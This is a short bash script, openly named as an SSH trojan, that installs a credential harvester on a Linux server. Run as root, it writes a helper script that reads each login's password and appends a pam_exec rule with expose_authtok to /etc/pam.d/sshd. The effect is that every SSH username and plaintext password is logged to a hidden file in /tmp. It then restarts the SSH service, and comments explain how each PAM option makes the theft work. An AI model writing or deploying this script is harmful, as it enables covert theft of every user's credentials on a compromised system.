#!/bin/bash

LogFile="/tmp/.log_sshtrojan1.txt"

#check root euid
if [[ $EUID -ne 0 ]]; then
    echo "Permission denied! Root required."
    exit 1
fi

#check log file existence
if [[ -e $LogFile ]]; then 
    echo "File $LogFile was created."
else
    echo "Create file $LogFile." 
    touch $LogFile
fi

PathScript="/usr/local/bin/sshlogininfo.sh"

#check script existence
if [[ -e $PathScript ]]; then 
    echo "Script $PathScript was created."
else
    echo "Create script $PathScript." 
    touch $PathScript
fi

cat > $PathScript << EOF
#!/bin/bash
read PASSWORD
echo "Username: \$PAM_USER"
echo "Password: \$PASSWORD"
EOF

chmod +x $PathScript

sshdPamConfigPath="/etc/pam.d/sshd"
cat >> $sshdPamConfigPath << EOF
@include common-auth
#use module pam_exec to call an external command
auth       required     pam_exec.so     expose_authtok     seteuid     log=$LogFile     $PathScript
EOF

#restart ssh service
/etc/init.d/ssh restart


#pam_exec is a PAM module that can be used to run an external command.
#The following PAM items are exported as environment variables: PAM_RHOST, PAM_RUSER, PAM_SERVICE, PAM_TTY, PAM_USER and PAM_TYPE,
# which contains one of the module types: account, auth, password, open_session and close_session.
#with options:
#expose_authtok : During authentication the calling command can read the password from stdin.
#log=file : The output of the command is appended to file
#seteuid : Per default pam_exec.so will execute the external command with the real user ID of the calling process. Specifying this option means the command is run with the effective user ID.

#PAM writes the password to stdin of the script and provides the user name as an environment variable.
#then, output of PathScript is appended to LogFile

